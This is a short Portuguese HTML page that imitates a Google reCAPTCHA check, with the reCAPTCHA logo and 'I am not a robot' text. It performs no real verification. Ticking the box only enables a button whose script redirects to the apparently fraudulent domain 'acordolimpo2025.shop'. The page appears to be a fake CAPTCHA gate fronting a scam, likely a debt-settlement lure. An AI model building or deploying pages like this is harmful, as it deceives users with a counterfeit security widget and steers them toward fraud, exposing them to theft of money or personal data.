<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verificação de Captcha</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #e9ecef;
        }
        .captcha-container {
            background: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
            text-align: center;
            width: 300px;
        }
        .captcha-box {
            display: flex;
            align-items: center;
            gap: 10px;
            border: 1px solid #ccc;
            padding: 10px;
            border-radius: 5px;
        }
        .captcha-box img {
            width: 50px;
            height: 50px;
        }
        .captcha-text {
            font-size: 18px;
            font-weight: bold;
            color: #333;
        }
        input[type="checkbox"] {
            width: 25px;
            height: 25px;
        }
        button {
            margin-top: 15px;
            padding: 10px 20px;
            background: #007bff;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            transition: 0.3s;
            width: 100%;
        }
        button:disabled {
            background: #ccc;
            cursor: not-allowed;
        }
    </style>
</head>
<body>
    <div class="captcha-container">
        <div class="captcha-box">
            <input type="checkbox" id="captcha" onclick="toggleButton()">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/ad/RecaptchaLogo.svg/1200px-RecaptchaLogo.svg.png" alt="Captcha">
            <span class="captcha-text">Não sou um robô</span>
        </div>
        <button id="submitBtn" disabled onclick="redirectToLink()">Enviar</button>
    </div>

    <script>
        function toggleButton() {
            const checkbox = document.getElementById("captcha");
            const button = document.getElementById("submitBtn");
            button.disabled = !checkbox.checked;
        }

        function redirectToLink() {
            window.location.href = "https://acordolimpo2025.shop";
        }
    </script>
</body>
</html>
